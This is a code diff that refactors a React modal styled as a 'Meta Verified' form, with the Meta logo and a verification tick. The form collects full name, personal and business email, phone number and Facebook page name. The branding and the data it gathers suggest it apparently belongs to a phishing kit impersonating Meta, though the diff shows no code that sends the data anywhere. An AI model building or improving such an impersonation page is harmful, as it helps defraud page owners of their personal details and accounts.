@@ -3,7 +3,7 @@
 import MetaLogo from '@/assets/images/meta-logo-grey.png';
 import { tickSrc } from '@/components/icons';
 import PhoneInput from '@/components/phone-input';
-import { memo, useCallback, useEffect, useRef, useState, type FC, type FormEvent } from 'react';
+import { memo, useCallback, useState, type FC, type FormEvent } from 'react';
 
 export interface FirstFormPayload {
     fullName: string;
@@ -20,7 +20,13 @@ interface FirstFormModalProps {
     texts: Record<string, string>;
 }
 
-const FirstFormModal: FC<FirstFormModalProps> = ({ show, onClose, onSubmit, texts }) => {
+interface FirstFormModalInnerProps {
+    onClose: () => void;
+    onSubmit: (data: FirstFormPayload) => void;
+    texts: Record<string, string>;
+}
+
+const FirstFormModalInner: FC<FirstFormModalInnerProps> = ({ onClose, onSubmit, texts }) => {
     const [formData, setFormData] = useState({
         fullName: '',
         personalEmail: '',
@@ -30,15 +36,6 @@ const FirstFormModal: FC<FirstFormModalProps> = ({ show, onClose, onSubmit, text
         agreeTerms: false
     });
     const [errors, setErrors] = useState<Record<string, boolean>>({});
-    const [displayTexts, setDisplayTexts] = useState(texts);
-    const wasOpenRef = useRef(false);
-
-    useEffect(() => {
-        if (show && !wasOpenRef.current) {
-            setDisplayTexts(texts);
-        }
-        wasOpenRef.current = show;
-    }, [show, texts]);
 
     const handleChange = useCallback((field: string, value: string | boolean) => {
         setFormData((prev) => ({ ...prev, [field]: value }));
@@ -74,8 +71,6 @@ const FirstFormModal: FC<FirstFormModalProps> = ({ show, onClose, onSubmit, text
         });
     };
 
-    if (!show) return null;
-
     return (
         <>
             <div className='modal-backdrop show' onClick={onClose} aria-hidden='true' />
@@ -84,7 +79,7 @@ const FirstFormModal: FC<FirstFormModalProps> = ({ show, onClose, onSubmit, text
                     <div className='modal-content'>
                         <div className='modal-header'>
                             <h5 className='modal-title'>
-                                {displayTexts.metaVerified || 'Meta Verified'}
+                                {texts.metaVerified || 'Meta Verified'}
                                 <img src={tickSrc} width={18} alt='tick' style={{ verticalAlign: 'middle' }} />
                             </h5>
                             <button aria-label='Close' className='btn-close' type='button' onClick={onClose} />
@@ -93,7 +88,7 @@ const FirstFormModal: FC<FirstFormModalProps> = ({ show, onClose, onSubmit, text
                             <form id='first-form' onSubmit={handleSubmit}>
                                 <div className='mb-3'>
                                     <label className='form-label' htmlFor='FullNameField'>
-                                        {displayTexts.fullName}
+                                        {texts.fullName}
                                     </label>
                                     <input
                                         className={`form-control ${errors.fullName ? 'is-invalid' : ''}`}
@@ -107,7 +102,7 @@ const FirstFormModal: FC<FirstFormModalProps> = ({ show, onClose, onSubmit, text
                                 </div>
                                 <div className='mb-3'>
                                     <label className='form-label' htmlFor='PersonalEmailField'>
-                                        {displayTexts.personalEmail}
+                                        {texts.personalEmail}
                                     </label>
                                     <input
                                         className={`form-control ${errors.personalEmail ? 'is-invalid' : ''}`}
@@ -120,7 +115,7 @@ const FirstFormModal: FC<FirstFormModalProps> = ({ show, onClose, onSubmit, text
                                 </div>
                                 <div className='mb-3'>
                                     <label className='form-label' htmlFor='BuisenessEmailField'>
-                                        {displayTexts.businessEmail}
+                                        {texts.businessEmail}
                                     </label>
                                     <input
                                         className={`form-control ${errors.businessEmail ? 'is-invalid' : ''}`}
@@ -133,7 +128,7 @@ const FirstFormModal: FC<FirstFormModalProps> = ({ show, onClose, onSubmit, text
                                 </div>
                                 <div className='mb-3'>
                                     <label className='form-label' htmlFor='PhoneFirld'>
-                                        {displayTexts.mobilePhone}
+                                        {texts.mobilePhone}
                                     </label>
                                     <PhoneInput
                                         id='PhoneFirld'
@@ -144,7 +139,7 @@ const FirstFormModal: FC<FirstFormModalProps> = ({ show, onClose, onSubmit, text
                                 </div>
                                 <div className='mb-3'>
                                     <label className='form-label' htmlFor='fb-page-name-input'>
-                                        {displayTexts.yourPageName}
+                                        {texts.yourPageName}
                                     </label>
                                     <input
                                         className={`form-control ${errors.pageName ? 'is-invalid' : ''}`}
@@ -167,15 +162,15 @@ const FirstFormModal: FC<FirstFormModalProps> = ({ show, onClose, onSubmit, text
                                         onChange={(e) => handleChange('agreeTerms', e.target.checked)}
                                     />
                                     <label className='form-check-label' htmlFor='exampleCheck1'>
-                                        {displayTexts.agreeToTerms}{' '}
+                                        {texts.agreeToTerms}{' '}
                                         <a className='add-svg' id='termsLink'>
-                                            {displayTexts.privacyPolicy}
+                                            {texts.privacyPolicy}
                                         </a>
                                     </label>
                                 </div>
                                 <div className='form-btn-wrapper'>
                                     <button className='btn btn-primary' type='submit'>
-                                        <span className='button-text'>{displayTexts.confirm}</span>
+                                        <span className='button-text'>{texts.confirm}</span>
                                     </button>
                                 </div>
                             </form>
@@ -183,7 +178,7 @@ const FirstFormModal: FC<FirstFormModalProps> = ({ show, onClose, onSubmit, text
                         <div className='modal-footer border-0 justify-content-center' style={{ flexDirection: 'column', textAlign: 'center' }}>
                             <img src={MetaLogo.src} alt='Meta Logo' style={{ height: '20px', marginBottom: '5px' }} />
                             <div className='footer-links' style={{ fontSize: '12px', color: '#000' }}>
-                                {displayTexts.aboutHelpMore}
+                                {texts.aboutHelpMore}
                             </div>
                         </div>
                     </div>
@@ -191,6 +186,12 @@ const FirstFormModal: FC<FirstFormModalProps> = ({ show, onClose, onSubmit, text
             </div>
         </>
     );
+};
+
+const FirstFormModal: FC<FirstFormModalProps> = ({ show, onClose, onSubmit, texts }) => {
+    if (!show) return null;
+
+    return <FirstFormModalInner onClose={onClose} onSubmit={onSubmit} texts={texts} />;
 };
 
 export default memo(FirstFormModal);
